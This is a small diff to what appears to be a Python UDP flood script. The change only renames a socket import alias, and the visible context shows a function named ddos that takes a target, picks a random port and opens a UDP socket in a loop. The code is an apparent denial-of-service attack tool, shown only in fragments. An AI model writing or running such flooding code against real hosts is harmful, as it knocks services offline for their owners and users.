@@ -7,7 +7,7 @@
 import sys
 import os
 import random
-from socket import socket as skt,AF_INET,SOCK_DGRAM
+from socket import socket, AF_INET, SOCK_DGRAM
 
 
 
@@ -17,7 +17,7 @@ def ddos(TARGET,count=False):
 
     port = random.randint(2500,65000)
     
-    s = skt(AF_INET,SOCK_DGRAM)
+    s = socket(AF_INET,SOCK_DGRAM)
     
     if count:
         for i in range(count):
